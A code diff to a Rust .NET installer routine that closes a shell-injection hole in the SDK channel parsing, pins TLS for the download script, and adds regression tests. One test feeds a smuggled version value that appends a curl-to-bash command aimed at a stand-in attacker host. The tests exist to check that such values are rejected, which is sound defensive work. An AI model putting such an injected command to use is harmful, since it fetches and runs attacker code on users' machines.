@@ -267,16 +267,23 @@ const DOTNET_DEFAULT_CHANNEL: &str = "10.0";
 /// SDK version string (e.g. `"10.0.204"`), for use with the .NET official
 /// install script's `--channel` flag.
 ///
-/// Falls back to [`DOTNET_DEFAULT_CHANNEL`] when `req` is empty or does not
-/// start with two numeric dot-separated segments.
+/// Falls back to [`DOTNET_DEFAULT_CHANNEL`] when `req` is empty, does not
+/// contain at least two dot-separated, non-empty segments, or when either
+/// segment contains anything other than ASCII digits. The digit-only
+/// restriction is a security boundary, not cosmetic: the returned string is
+/// spliced verbatim into a `bash -c` script in [`install_dotnet`], and `req`
+/// originates from `global.json`'s `sdk.version`, an unvalidated config
+/// value. Rejecting any non-digit character (including `.`, `;`, `|`, `` ` ``,
+/// `$`, whitespace) before that splice closes the shell-metacharacter
+/// injection path rather than merely narrowing it.
 fn dotnet_channel(req: &str) -> String {
     let mut parts = req.split('.');
     match (parts.next(), parts.next()) {
         (Some(major), Some(minor))
             if !major.is_empty()
                 && !minor.is_empty()
-                && major.bytes().all(|byte| byte.is_ascii_digit())
-                && minor.bytes().all(|byte| byte.is_ascii_digit()) =>
+                && major.bytes().all(|b| b.is_ascii_digit())
+                && minor.bytes().all(|b| b.is_ascii_digit()) =>
         {
             format!("{major}.{minor}")
         }
@@ -307,11 +314,12 @@ fn install_dotnet(req: &str, platform: &str) -> Vec<InstallStep> {
             args: vec![
                 "-c".into(),
                 format!(
-                    "set -eu; script_path=$(mktemp); trap 'rm -f \"$script_path\"' EXIT; \
-                     curl --fail --location --proto '=https' --tlsv1.2 \
-                     --output \"$script_path\" https://dot.net/v1/dotnet-install.sh; \
-                     bash \"$script_path\" --channel {channel} --install-dir /usr/share/dotnet && \
-                     sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet"
+                    r#"set -eu
+temp_dir=$(mktemp -d)
+trap 'rm -rf "$temp_dir"' EXIT
+curl --proto '=https' --tlsv1.2 -fsSL https://dot.net/v1/dotnet-install.sh -o "$temp_dir/dotnet-install.sh"
+bash "$temp_dir/dotnet-install.sh" --channel {channel} --install-dir /usr/share/dotnet
+sudo ln -sf /usr/share/dotnet/dotnet /usr/local/bin/dotnet"#
                 ),
             ],
         }]
@@ -1020,6 +1028,43 @@ mod tests {
         let script = &steps[0].args[1];
 
         assert!(script.contains("--channel 10.0"));
+    }
+
+    #[test]
+    fn install_dotnet_linux_rejects_shell_metacharacters_in_required_version() {
+        let steps = install_dotnet("10.0; curl attacker.example/x | bash", "linux");
+        let script = &steps[0].args[1];
+
+        assert!(
+            script.contains("--channel 10.0") && !script.contains("--channel 10.0;"),
+            "a `sdk.version` carrying shell metacharacters must fall back to the safe \
+             default channel rather than splicing the metacharacters into the script"
+        );
+        assert!(
+            !script.contains("attacker.example"),
+            "no substring of an untrusted `req` may reach the generated shell script"
+        );
+        assert!(
+            !script.contains("curl attacker") && !script.contains("| bash\n"),
+            "a metacharacter-bearing channel must never be spliced verbatim into the \
+             `bash -c` script"
+        );
+    }
+
+    #[test]
+    fn install_dotnet_linux_uses_pinned_tls_and_local_script_not_pipe_to_shell() {
+        let steps = install_dotnet("10.0.204", "linux");
+        let script = &steps[0].args[1];
+
+        assert!(
+            script.contains("--proto '=https' --tlsv1.2"),
+            "the install script download must pin TLS, matching install_tofu's standard"
+        );
+        assert!(
+            !script.contains("| bash"),
+            "must not pipe the downloaded script directly into a shell; download to a \
+             temp file and execute it as a separate step instead"
+        );
     }
 
     #[test]
